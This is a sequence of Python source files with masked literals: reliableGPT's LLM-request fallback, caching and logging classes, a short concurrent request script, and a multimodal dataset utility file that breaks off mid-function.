<s> from termcolor import colored <EOL> import requests <EOL> import copy <EOL> import posthog <EOL> import openai <EOL> from openai import ChatCompletion <EOL> import traceback <EOL> from uuid import uuid4 <EOL> from waitress import serve <EOL> from flask import Flask , request <EOL> from uuid import uuid4 <EOL> import traceback <EOL> from threading import active_count <EOL> import random <EOL> import time <EOL> import asyncio <EOL> import signal <EOL> from posthog import Posthog <EOL> posthog = Posthog ( <EOL> project_api_key = '<STR_LIT>' , <EOL> host = '<STR_LIT>' ) <EOL> class CustomError ( Exception ) : <EOL> def __init__ ( self , error ) : <EOL> self . error = error <EOL> class IndividualRequest : <EOL> def __init__ ( self , <EOL> model = None , <EOL> fallback_strategy = [ <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' <EOL> ] , <EOL> azure_fallback_strategy = None , <EOL> graceful_string = "<STR_LIT>" , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = "<STR_LIT>" , <EOL> send_notification = False , <EOL> logging_fn = None , <EOL> backup_openai_key = "<STR_LIT>" , <EOL> caching = False , <EOL> alerting = None , <EOL> max_threads = None , <EOL> _test = False , <EOL> verbose = False ) : <EOL> self . model = model <EOL> self . model_function = model . get_model_function ( ) <EOL> self . verbose = verbose <EOL> self . graceful_string = graceful_string <EOL> self . fallback_strategy = fallback_strategy <EOL> self . user_email = user_email <EOL> self . user_token = user_token <EOL> self . save_request = logging_fn <EOL> self . backup_openai_key = backup_openai_key <EOL> self . _test = _test <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . caching = caching <EOL> self . max_threads = max_threads <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . alerting = alerting <EOL> self . azure_fallback_strategy = azure_fallback_strategy <EOL> self . backup_model = None <EOL> self . set_cooldown = False <EOL> self . cooldown_start_time = time . time ( ) <EOL> def handle_unhandled_exception ( self , e ) : <EOL> self . print_verbose ( colored ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> if self . alerting : <EOL> self . alerting . add_error ( error_type = "<STR_LIT>" , error_description = traceback . format_exc ( ) ) <EOL> def print_verbose ( self , print_statement ) : <EOL> posthog . capture ( '<STR_LIT>' , '<STR_LIT>' , { '<STR_LIT>' : str ( print_statement ) [ : <NUM_LIT> ] } ) <EOL> if self . verbose : <EOL> print ( colored ( "<STR_LIT>" + str ( print_statement ) , "<STR_LIT>" ) ) <EOL> def start_cooldown ( self ) : <EOL> self . set_cooldown = True <EOL> self . cooldown_start_time = time . time ( ) <EOL> def call_model ( self , args , kwargs ) : <EOL> try : <EOL> if self . _test : <EOL> error = { "<STR_LIT>" : "<STR_LIT>" } <EOL> raise CustomError ( error ) <EOL> if self . set_cooldown : <EOL> if time . time ( ) - self . cooldown_start_time > <NUM_LIT> : <EOL> error = { "<STR_LIT>" : "<STR_LIT>" } <EOL> raise ( CustomError ( error = error ) ) <EOL> else : <EOL> self . set_cooldown = False <EOL> result = self . model_function ( * args , ** kwargs ) <EOL> if result == None : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return <EOL> error = { "<STR_LIT>" : f"<STR_LIT>" } <EOL> raise CustomError ( error ) <EOL> if "<STR_LIT>" in kwargs : <EOL> if "<STR_LIT>" in kwargs : <EOL> self . curr_azure_model = kwargs [ "<STR_LIT>" ] <EOL> if self . caching : <EOL> self . print_verbose ( kwargs [ "<STR_LIT>" ] ) <EOL> input_prompt = "<STR_LIT>" . join ( message [ "<STR_LIT>" ] <EOL> for message in kwargs [ "<STR_LIT>" ] ) <EOL> extracted_result = result [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> self . print_verbose ( f'<STR_LIT>' ) <EOL> self . add_cache ( <EOL> input_prompt , extracted_result <EOL> ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return result <EOL> except Exception as e : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . print_verbose ( "<STR_LIT>" ) <EOL> self . start_cooldown ( ) <EOL> return self . handle_exception ( args , kwargs , e ) <EOL> async def async_call_model ( self , args , kwargs ) : <EOL> try : <EOL> if self . _test : <EOL> error = { "<STR_LIT>" : "<STR_LIT>" } <EOL> raise CustomError ( error ) <EOL> if self . set_cooldown : <EOL> if time . time ( ) - self . cooldown_start_time > <NUM_LIT> : <EOL> error = { "<STR_LIT>" : "<STR_LIT>" } <EOL> raise ( CustomError ( error = error ) ) <EOL> else : <EOL> self . set_cooldown = False <EOL> result = await self . model_function ( * args , ** kwargs ) <EOL> if "<STR_LIT>" in kwargs : <EOL> if "<STR_LIT>" in kwargs : <EOL> self . curr_azure_model = kwargs [ "<STR_LIT>" ] <EOL> if self . caching : <EOL> self . print_verbose ( kwargs [ "<STR_LIT>" ] ) <EOL> input_prompt = "<STR_LIT>" . join ( message [ "<STR_LIT>" ] <EOL> for message in kwargs [ "<STR_LIT>" ] ) <EOL> extracted_result = result [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> self . print_verbose ( f'<STR_LIT>' ) <EOL> self . add_cache ( <EOL> input_prompt , extracted_result <EOL> ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return result <EOL> except Exception as e : <EOL> self . print_verbose ( "<STR_LIT>" ) <EOL> self . start_cooldown ( ) <EOL> return self . handle_exception ( args , kwargs , e ) <EOL> def __call__ ( self , * args , ** kwargs ) : <EOL> try : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> try : <EOL> self . save_request ( <EOL> user_email = self . user_email , <EOL> graceful_string = self . graceful_string , <EOL> posthog_event = '<STR_LIT>' , <EOL> ) <EOL> except : <EOL> self . print_verbose ( "<STR_LIT>" ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> if self . max_threads and self . caching : <EOL> self . print_verbose ( f'<STR_LIT>' ) <EOL> thread_utilization = active_count ( ) / self . max_threads <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> if thread_utilization > <NUM_LIT> : <EOL> if "<STR_LIT>" in kwargs and self . caching : <EOL> self . print_verbose ( kwargs [ "<STR_LIT>" ] ) <EOL> input_prompt = "<STR_LIT>" . join ( message [ "<STR_LIT>" ] <EOL> for message in kwargs [ "<STR_LIT>" ] ) <EOL> self . print_verbose ( <EOL> f"<STR_LIT>" ) <EOL> result = self . try_cache_request ( query = input_prompt ) <EOL> if self . alerting : <EOL> self . alerting . add_error ( error_type = "<STR_LIT>" , error_description = "<STR_LIT>" ) <EOL> if result == None : <EOL> pass <EOL> else : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> self . save_request ( <EOL> user_email = self . user_email , <EOL> posthog_event = '<STR_LIT>' , <EOL> graceful_string = self . graceful_string , <EOL> result = result , <EOL> posthog_metadata = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : result , <EOL> } , <EOL> errors = [ '<STR_LIT>' ] , <EOL> function_name = str ( self . model_function ) , <EOL> kwargs = kwargs <EOL> ) <EOL> return result <EOL> if asyncio . iscoroutinefunction ( self . model_function ) : <EOL> return self . async_call_model ( args = args , kwargs = kwargs ) <EOL> else : <EOL> return self . call_model ( args = args , kwargs = kwargs ) <EOL> except Exception as e : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> def add_cache ( self , input_prompt , response ) : <EOL> try : <EOL> if self . caching : <EOL> if request : <EOL> if request . args and request . args . get ( "<STR_LIT>" ) : <EOL> customer_id = request . args . get ( "<STR_LIT>" ) <EOL> if request . args . get ( "<STR_LIT>" ) : <EOL> instance_id = request . args . get ( "<STR_LIT>" ) <EOL> else : <EOL> instance_id = <NUM_LIT> <EOL> user_email = self . user_email <EOL> url = "<STR_LIT>" <EOL> querystring = { <EOL> "<STR_LIT>" : customer_id , <EOL> "<STR_LIT>" : instance_id , <EOL> "<STR_LIT>" : user_email , <EOL> "<STR_LIT>" : input_prompt , <EOL> "<STR_LIT>" : response <EOL> } <EOL> response = requests . post ( url , params = querystring ) <EOL> except : <EOL> pass <EOL> def try_cache_request ( self , query = None ) : <EOL> try : <EOL> if query : <EOL> self . print_verbose ( "<STR_LIT>" ) <EOL> if request : <EOL> if request . args and request . args . get ( "<STR_LIT>" ) : <EOL> customer_id = request . args . get ( "<STR_LIT>" ) <EOL> if request . args . get ( "<STR_LIT>" ) : <EOL> instance_id = request . args . get ( "<STR_LIT>" ) <EOL> else : <EOL> instance_id = <NUM_LIT> <EOL> user_email = self . user_email <EOL> url = "<STR_LIT>" <EOL> querystring = { <EOL> "<STR_LIT>" : customer_id , <EOL> "<STR_LIT>" : instance_id , <EOL> "<STR_LIT>" : user_email , <EOL> "<STR_LIT>" : query , <EOL> } <EOL> response = requests . get ( url , params = querystring ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> extracted_result = response . json ( ) [ "<STR_LIT>" ] <EOL> results = { "<STR_LIT>" : [ { "<STR_LIT>" : { "<STR_LIT>" : extracted_result } } ] } <EOL> return results <EOL> except : <EOL> traceback . print_exc ( ) <EOL> pass <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return None <EOL> def fallback_request ( self , args , kwargs , fallback_strategy ) : <EOL> try : <EOL> self . print_verbose ( "<STR_LIT>" ) <EOL> result = None <EOL> new_kwargs = copy . deepcopy ( kwargs ) <EOL> if self . backup_openai_key and len ( <EOL> self . backup_openai_key <EOL> ) > <NUM_LIT> : <EOL> new_kwargs [ "<STR_LIT>" ] = openai . __dict__ . copy ( <EOL> ) <EOL> if "<STR_LIT>" in str ( self . model_function ) : <EOL> fallback_strategy = [ "<STR_LIT>" ] <EOL> if self . azure_fallback_strategy : <EOL> for engine in self . azure_fallback_strategy : <EOL> new_kwargs [ "<STR_LIT>" ] = engine <EOL> new_kwargs [ "<STR_LIT>" ] = True <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> result = self . make_LLM_request ( new_kwargs ) <EOL> if result != None : <EOL> return result <EOL> for model in fallback_strategy : <EOL> new_kwargs [ '<STR_LIT>' ] = model <EOL> result = self . make_LLM_request ( new_kwargs ) <EOL> if result != None : <EOL> return result <EOL> return None <EOL> except : <EOL> self . print_verbose ( traceback . format_exc ( ) ) <EOL> return None <EOL> def make_LLM_request ( self , new_kwargs ) : <EOL> embedding_model = self . model . get_original_embeddings ( ) <EOL> chat_model = self . model . get_original_chat ( ) <EOL> completion_model = self . model . get_original_completion ( ) <EOL> try : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> if "<STR_LIT>" in new_kwargs : <EOL> new_kwargs_except_azure_fallback_flag = { <EOL> k : v <EOL> for k , v in new_kwargs . items ( ) if k != "<STR_LIT>" <EOL> } <EOL> return chat_model ( ** new_kwargs_except_azure_fallback_flag ) <EOL> if "<STR_LIT>" in new_kwargs : <EOL> openai . api_type = "<STR_LIT>" <EOL> openai . api_base = "<STR_LIT>" <EOL> openai . api_version = None <EOL> openai . api_key = self . backup_openai_key <EOL> new_kwargs_except_openai_attributes = { <EOL> k : v <EOL> for k , v in new_kwargs . items ( ) if k != "<STR_LIT>" <EOL> } <EOL> new_kwargs_except_engine = { <EOL> k : v <EOL> for k , v in new_kwargs_except_openai_attributes . items ( ) <EOL> if k != "<STR_LIT>" <EOL> } <EOL> completion = self . model_function ( ** new_kwargs_except_engine ) <EOL> openai . api_type = new_kwargs [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> openai . api_base = new_kwargs [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> openai . api_version = new_kwargs [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> openai . api_key = new_kwargs [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> return completion <EOL> if "<STR_LIT>" in str ( self . model_function ) : <EOL> self . print_verbose ( colored ( f"<STR_LIT>" , "<STR_LIT>" ) ) <EOL> return embedding_model ( ** new_kwargs ) <EOL> model = str ( new_kwargs [ '<STR_LIT>' ] ) <EOL> self . print_verbose ( <EOL> colored ( f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> if "<STR_LIT>" in model or "<STR_LIT>" in model : <EOL> self . print_verbose ( <EOL> colored ( <EOL> f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> return chat_model ( ** new_kwargs ) <EOL> else : <EOL> self . print_verbose ( <EOL> colored ( f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> new_kwargs [ '<STR_LIT>' ] = "<STR_LIT>" . join ( <EOL> [ message [ "<STR_LIT>" ] for message in new_kwargs [ '<STR_LIT>' ] ] ) <EOL> new_kwargs . pop ( '<STR_LIT>' , <EOL> None ) <EOL> return completion_model ( ** new_kwargs ) <EOL> except Exception as e : <EOL> self . print_verbose ( colored ( f"<STR_LIT>" , "<STR_LIT>" ) ) <EOL> raise ValueError ( e ) <EOL> def api_key_handler ( self , args , kwargs , fallback_strategy , user_email , <EOL> user_token ) : <EOL> try : <EOL> url = f"<STR_LIT>" <EOL> response = requests . get ( url ) <EOL> if response . status_code == <NUM_LIT> : <EOL> result = response . json ( ) <EOL> if result [ '<STR_LIT>' ] == '<STR_LIT>' : <EOL> self . print_verbose ( <EOL> colored ( <EOL> f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> return None <EOL> fallback_keys = result [ '<STR_LIT>' ] [ <EOL> '<STR_LIT>' ] <EOL> if len ( fallback_keys ) == <NUM_LIT> : <EOL> return None <EOL> for fallback_key in fallback_keys : <EOL> openai . api_key = fallback_key <EOL> result = self . make_LLM_request ( kwargs ) <EOL> if result != None : <EOL> return result <EOL> else : <EOL> self . print_verbose ( <EOL> colored ( <EOL> f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> return None <EOL> except Exception as e : <EOL> raise ValueError ( e ) <EOL> def handle_openAI_error ( self , <EOL> args , <EOL> kwargs , <EOL> openAI_error , <EOL> fallback_strategy , <EOL> graceful_string , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = "<STR_LIT>" ) : <EOL> self . print_verbose ( <EOL> colored ( f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> if openAI_error != None : <EOL> openAI_error = openAI_error . error <EOL> error_type = None <EOL> if openAI_error != None and '<STR_LIT>' in openAI_error : <EOL> error_type = openAI_error [ '<STR_LIT>' ] <EOL> if error_type == '<STR_LIT>' or error_type == '<STR_LIT>' : <EOL> if openAI_error . code == '<STR_LIT>' : <EOL> self . print_verbose ( <EOL> colored ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> fallback_strategy = [ '<STR_LIT>' ] + fallback_strategy <EOL> result = self . fallback_request ( args = args , <EOL> kwargs = kwargs , <EOL> fallback_strategy = fallback_strategy ) <EOL> if result == None : <EOL> return graceful_string <EOL> else : <EOL> return result <EOL> if openAI_error . code == "<STR_LIT>" : <EOL> self . print_verbose ( <EOL> colored ( "<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> result = self . api_key_handler ( args = args , <EOL> kwargs = kwargs , <EOL> fallback_strategy = fallback_strategy , <EOL> user_email = user_email , <EOL> user_token = user_token ) <EOL> if result == None : <EOL> return graceful_string <EOL> else : <EOL> return result <EOL> elif error_type == '<STR_LIT>' or error_type == '<STR_LIT>' : <EOL> self . print_verbose ( colored ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> return graceful_string <EOL> result = self . fallback_request ( args = args , <EOL> kwargs = kwargs , <EOL> fallback_strategy = fallback_strategy ) <EOL> if result == None : <EOL> return graceful_string <EOL> else : <EOL> return result <EOL> return graceful_string <EOL> def handle_exception ( self , args , kwargs , e ) : <EOL> result = self . graceful_string <EOL> try : <EOL> self . print_verbose ( colored ( f"<STR_LIT>" , '<STR_LIT>' ) ) <EOL> result = self . handle_openAI_error ( <EOL> args = args , <EOL> kwargs = kwargs , <EOL> openAI_error = e , <EOL> fallback_strategy = self . fallback_strategy , <EOL> graceful_string = self . graceful_string , <EOL> user_email = self . user_email , <EOL> user_token = self . user_token ) <EOL> self . print_verbose ( <EOL> colored ( f"<STR_LIT>" , <EOL> "<STR_LIT>" ) ) <EOL> if result == self . graceful_string : <EOL> if "<STR_LIT>" in kwargs and self . caching : <EOL> self . print_verbose ( kwargs [ "<STR_LIT>" ] ) <EOL> input_prompt = "<STR_LIT>" . join ( message [ "<STR_LIT>" ] <EOL> for message in kwargs [ "<STR_LIT>" ] ) <EOL> cached_response = self . try_cache_request ( query = input_prompt ) <EOL> if cached_response == None : <EOL> pass <EOL> else : <EOL> self . save_request ( <EOL> user_email = self . user_email , <EOL> posthog_event = '<STR_LIT>' , <EOL> graceful_string = self . graceful_string , <EOL> result = cached_response , <EOL> posthog_metadata = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cached_response , <EOL> } , <EOL> errors = [ '<STR_LIT>' ] , <EOL> function_name = str ( self . model_function ) , <EOL> kwargs = kwargs <EOL> ) <EOL> return cached_response <EOL> self . save_request ( <EOL> user_email = self . user_email , <EOL> graceful_string = self . graceful_string , <EOL> posthog_event = '<STR_LIT>' , <EOL> result = result , <EOL> posthog_metadata = { <EOL> '<STR_LIT>' : str ( e ) , <EOL> '<STR_LIT>' : result <EOL> } , <EOL> errors = [ e ] , <EOL> function_name = str ( self . model_function ) , <EOL> kwargs = kwargs ) <EOL> else : <EOL> self . save_request ( user_email = self . user_email , <EOL> graceful_string = self . graceful_string , <EOL> posthog_event = "<STR_LIT>" , <EOL> result = result , <EOL> posthog_metadata = { <EOL> '<STR_LIT>' : str ( e ) , <EOL> '<STR_LIT>' : result <EOL> } , <EOL> errors = [ e ] , <EOL> function_name = str ( self . model_function ) , <EOL> kwargs = kwargs ) <EOL> except Exception as e2 : <EOL> traceback . print_exc ( ) <EOL> self . print_verbose ( "<STR_LIT>" , e2 ) <EOL> self . save_request ( <EOL> user_email = self . user_email , <EOL> graceful_string = self . graceful_string , <EOL> posthog_event = '<STR_LIT>' , <EOL> result = "<STR_LIT>" , <EOL> posthog_metadata = { <EOL> '<STR_LIT>' : str ( e ) , <EOL> '<STR_LIT>' : str ( e2 ) , <EOL> '<STR_LIT>' : self . graceful_string <EOL> } , <EOL> errors = [ e , e2 ] , <EOL> function_name = str ( self . model_function ) , <EOL> kwargs = kwargs ) <EOL> raise e <EOL> return result <EOL> </s>
<s> import requests <EOL> import concurrent . futures <EOL> import time <EOL> url = "<STR_LIT>" <EOL> params = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> queries = [ ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> query = f"<STR_LIT>" <EOL> queries . append ( query ) <EOL> def make_request ( query ) : <EOL> params [ "<STR_LIT>" ] = query <EOL> params [ "<STR_LIT>" ] = <NUM_LIT> <EOL> print ( f"<STR_LIT>" ) <EOL> response = requests . get ( url , params = params ) <EOL> print ( response ) <EOL> return response . text <EOL> start_time = time . time ( ) <EOL> with concurrent . futures . ThreadPoolExecutor ( max_workers = <NUM_LIT> ) as executor : <EOL> futures = [ executor . submit ( make_request , query ) for query in queries ] <EOL> concurrent . futures . wait ( futures ) <EOL> results = [ future . result ( ) for future in futures ] <EOL> end_time = time . time ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> for result in results : <EOL> print ( result ) <EOL> </s>
<s> from reliablegpt . IndividualRequest import IndividualRequest <EOL> from reliablegpt . Model import Model <EOL> from reliablegpt . Alerting import Alerting <EOL> import requests <EOL> import asyncio <EOL> from posthog import Posthog <EOL> from flask import Flask , request <EOL> posthog = Posthog ( <EOL> project_api_key = '<STR_LIT>' , <EOL> host = '<STR_LIT>' ) <EOL> alerting = Alerting ( ) <EOL> def save_exception ( type , user_email , result = "<STR_LIT>" , original_error = "<STR_LIT>" , error2 = "<STR_LIT>" , function_name = "<STR_LIT>" , kwargs = { } ) : <EOL> try : <EOL> url = '<STR_LIT>' <EOL> data = { <EOL> '<STR_LIT>' : type , <EOL> '<STR_LIT>' : user_email , <EOL> '<STR_LIT>' : result , <EOL> '<STR_LIT>' : original_error , <EOL> '<STR_LIT>' : error2 , <EOL> '<STR_LIT>' : function_name , <EOL> '<STR_LIT>' : kwargs <EOL> } <EOL> response = requests . post ( url , json = data ) <EOL> except Exception as e : <EOL> pass <EOL> return response <EOL> def save_request ( user_email , <EOL> graceful_string , <EOL> posthog_event = "<STR_LIT>" , <EOL> result = "<STR_LIT>" , <EOL> posthog_metadata = { } , <EOL> errors = [ ] , function_name = "<STR_LIT>" , kwargs = { } ) : <EOL> try : <EOL> if posthog_event != "<STR_LIT>" : <EOL> posthog . capture ( user_email , posthog_event , <EOL> posthog_metadata ) <EOL> if posthog_event == '<STR_LIT>' : <EOL> original_error = "<STR_LIT>" <EOL> if '<STR_LIT>' in posthog_metadata : <EOL> original_error = posthog_metadata [ '<STR_LIT>' ] <EOL> save_exception ( type = '<STR_LIT>' , user_email = user_email , result = result , original_error = original_error , function_name = function_name , kwargs = kwargs ) <EOL> if posthog_event == '<STR_LIT>' : <EOL> original_error = "<STR_LIT>" <EOL> if '<STR_LIT>' in posthog_metadata : <EOL> original_error = posthog_metadata [ '<STR_LIT>' ] <EOL> save_exception ( type = '<STR_LIT>' , user_email = user_email , result = result , original_error = original_error , function_name = function_name , kwargs = kwargs ) <EOL> if posthog_event == '<STR_LIT>' : <EOL> original_error = "<STR_LIT>" <EOL> error2 = "<STR_LIT>" <EOL> if '<STR_LIT>' in posthog_metadata : <EOL> original_error = posthog_metadata [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in posthog_metadata : <EOL> error2 = posthog_metadata [ '<STR_LIT>' ] <EOL> save_exception ( type = '<STR_LIT>' , user_email = user_email , result = result , original_error = original_error , error2 = error2 , function_name = function_name , kwargs = kwargs ) <EOL> if result == graceful_string or len ( <EOL> errors ) == <NUM_LIT> : <EOL> for error in errors : <EOL> alerting . add_error ( error ) <EOL> except : <EOL> pass <EOL> return <EOL> def reliableGPT ( openai_create_function , <EOL> fallback_strategy = [ <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' <EOL> ] , <EOL> azure_fallback_strategy = None , <EOL> graceful_string = "<STR_LIT>" , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = "<STR_LIT>" , <EOL> send_notification = True , <EOL> caching = False , <EOL> max_threads = None , <EOL> backup_openai_key = None , <EOL> _test = False , <EOL> verbose = False ) : <EOL> primary_email = "<STR_LIT>" <EOL> if isinstance ( user_email , str ) : <EOL> if user_email == "<STR_LIT>" : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> else : <EOL> alerting . add_emails ( user_email ) <EOL> primary_email = user_email <EOL> elif isinstance ( user_email , list ) : <EOL> primary_email = user_email [ <NUM_LIT> ] <EOL> for email in user_email : <EOL> alerting . add_emails ( email ) <EOL> model = Model ( openai_create_function ) <EOL> return IndividualRequest ( model , <EOL> fallback_strategy = fallback_strategy , <EOL> azure_fallback_strategy = azure_fallback_strategy , <EOL> graceful_string = graceful_string , <EOL> user_email = primary_email , <EOL> user_token = user_token , <EOL> logging_fn = save_request , <EOL> send_notification = send_notification , <EOL> backup_openai_key = backup_openai_key , <EOL> caching = caching , <EOL> max_threads = max_threads , <EOL> alerting = alerting , <EOL> _test = _test , <EOL> verbose = verbose ) <EOL> </s>
<s> from typing import Dict , List , Any , Union , Optional <EOL> from collections import Counter <EOL> from functools import cache <EOL> import contextlib <EOL> import tempfile <EOL> import shutil <EOL> import random <EOL> import subprocess <EOL> import json <EOL> import re <EOL> import io <EOL> import os <EOL> import torch <EOL> import requests <EOL> import transformers <EOL> import numpy as np <EOL> from datasets import load_dataset , Dataset <EOL> from PIL import Image <EOL> from multi_token . constants import IGNORE_INDEX <EOL> def encode_chat ( <EOL> item : Dict , <EOL> tokenizer : transformers . PreTrainedTokenizer , <EOL> modalities : List [ "<STR_LIT>" ] , <EOL> ) -> Dict : <EOL> messages = list ( item [ "<STR_LIT>" ] ) <EOL> chat_as_string = tokenizer . apply_chat_template ( messages , tokenize = False ) <EOL> token_to_modality = { m . token : m for m in modalities } <EOL> modality_token_counts = Counter ( ) <EOL> instruct_pattern = r"<STR_LIT>" <EOL> pattern = "<STR_LIT>" + "<STR_LIT>" . join ( re . escape ( m . token ) for m in modalities ) + "<STR_LIT>" <EOL> chat_part = re . split ( instruct_pattern , chat_as_string ) <EOL> input_ids = [ ] <EOL> labels = [ ] <EOL> for part in chat_part : <EOL> if "<STR_LIT>" in part : <EOL> is_instruction = True <EOL> else : <EOL> is_instruction = False <EOL> for subpart in re . split ( pattern , part ) : <EOL> if not subpart : <EOL> continue <EOL> if subpart in token_to_modality : <EOL> assert ( <EOL> is_instruction <EOL> ) , "<STR_LIT>" <EOL> m = token_to_modality [ subpart ] <EOL> modality_token_counts [ m . name ] += <NUM_LIT> <EOL> input_ids . extend ( [ m . token_idx ] * m . token_width ) <EOL> labels . extend ( [ IGNORE_INDEX ] * m . token_width ) <EOL> elif is_instruction : <EOL> part_ids = tokenizer ( subpart , add_special_tokens = False ) . input_ids <EOL> input_ids . extend ( part_ids ) <EOL> labels . extend ( [ IGNORE_INDEX ] * len ( part_ids ) ) <EOL> else : <EOL> part_ids = tokenizer ( subpart , add_special_tokens = False ) . input_ids <EOL> input_ids . extend ( part_ids ) <EOL> labels . extend ( part_ids ) <EOL> input_ids = torch . tensor ( input_ids , dtype = torch . long ) <EOL> labels = torch . tensor ( labels , dtype = torch . long ) <EOL> data_dict = dict ( <EOL> input_ids = input_ids , <EOL> labels = labels , <EOL> ) <EOL> for m in modalities : <EOL> data_dict [ m . name ] = m . preprocess_rows ( [ item ] ) [ <NUM_LIT> ] <EOL> return data_dict <EOL> def load_image ( value : Any ) -> Image . Image : <EOL> img = None <EOL> if isinstance ( value , str ) : <EOL> if value . startswith ( "<STR_LIT>" ) or value . startswith ( "<STR_LIT>" ) : <EOL> response = requests . get ( value ) <EOL> img = Image . open ( io . BytesIO ( response . content ) ) <EOL> elif os . path . exists ( value ) : <EOL> img = Image . open ( value ) <EOL> elif isinstance ( value , Image . Image ) : <EOL> img = value <EOL> if img is None : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> img = img . convert ( "<STR_LIT>" ) <EOL> return img <EOL> @ contextlib . contextmanager <EOL> def with_local_files ( fn_or_urls : List [ Any ] ) : <EOL> local_fns = [ ] <EOL> fps = [ ] <EOL> for fn_or_url in fn_or_urls : <EOL> if isinstance ( fn_or_url , Image . Image ) : <EOL> fp = tempfile . NamedTemporaryFile ( suffix = "<STR_LIT>" , mode = "<STR_LIT>" ) <EOL> fn_or_url . convert ( "<STR_LIT>" ) . save ( fp ) <EOL> fps . append ( fp ) <EOL> local_fns . append ( fp . name ) <EOL> elif fn_or_url . startswith ( "<STR_LIT>" ) or fn_or_url . startswith ( "<STR_LIT>" ) : <EOL> suffix = os . path . splitext ( fn_or_url ) [ - <NUM_LIT> ] <EOL> with requests . get ( fn_or_url , stream = True ) as r : <EOL> fp = tempfile . NamedTemporaryFile ( suffix = suffix , mode = "<STR_LIT>" ) <EOL> shutil . copyfileobj ( r . raw , fp ) <EOL> fps . append ( fp ) <EOL> local_fns . append ( fp . name ) <EOL> else : <EOL> local_fns . append ( fn_or_url ) <EOL> try : <EOL> yield local_fns <EOL> finally : <EOL> for fp in fps : <EOL> fp . close ( ) <EOL> @ cache <EOL> def _get_dataset ( dataset_args : str ) -> Dataset : <EOL> return load_dataset ( ** json . loads ( dataset_args ) ) <EOL> def get_dataset_cached ( dataset_args : Dict ) -> Dataset : <EOL> return _get_dataset ( json . dumps ( dataset_args ) ) <EOL> def load_audio ( input_ : Union [ Dict , str ] , target_sampling_rate : int = None ) -> Dict : <EOL> import soundfile as sf <EOL> import librosa <EOL> if isinstance ( input_ , dict ) and "<STR_LIT>" in input_ and "<STR_LIT>" in input_ : <EOL> array = input_ [ "<STR_LIT>" ] <EOL> sampling_rate = input_ [ "<STR_LIT>" ] <EOL> elif isinstance ( input_ , dict ) and "<STR_LIT>" in input_ : <EOL> item = get_dataset_cached ( input_ [ "<STR_LIT>" ] ) [ input_ [ "<STR_LIT>" ] ] <EOL> array = item [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> sampling_rate = item [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> elif isinstance ( input_ , dict ) and "<STR_LIT>" in input_ : <EOL> with with_local_files ( [ input_ [ "<STR_LIT>" ] ] ) as local_fns : <EOL> array , sampling_rate = sf . read ( local_fns [ <NUM_LIT> ] ) <EOL> elif isinstance ( input_ , str ) : <EOL> with with_local_files ( [ input_ ] ) as local_fns : <EOL> array , sampling_rate = sf . read ( local_fns [ <NUM_LIT> ] ) <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> if array . ndim == <NUM_LIT> : <EOL> array = array . mean ( axis = <NUM_LIT> ) <EOL> if target_sampling_rate is not None and sampling_rate != target_sampling_rate : <EOL> array = librosa . resample ( <EOL> array , orig_sr = sampling_rate , target_sr = target_sampling_rate <EOL> ) <EOL> sampling_rate = target_sampling_rate <EOL> return { "<STR_LIT>" : list ( array ) , "<STR_LIT>" : sampling_rate } <EOL> def _download_yt_video ( url : str ) -> str : <EOL> from pytube import YouTube <EOL> youtube = YouTube ( url ) <EOL> video = youtube . streams . first ( ) <EOL> fn = "<STR_LIT>" . join ( random . choices ( "<STR_LIT>" , k = <NUM_LIT> ) ) <EOL> file_path = video . download ( output_path = tempfile . gettempdir ( ) , filename = fn ) 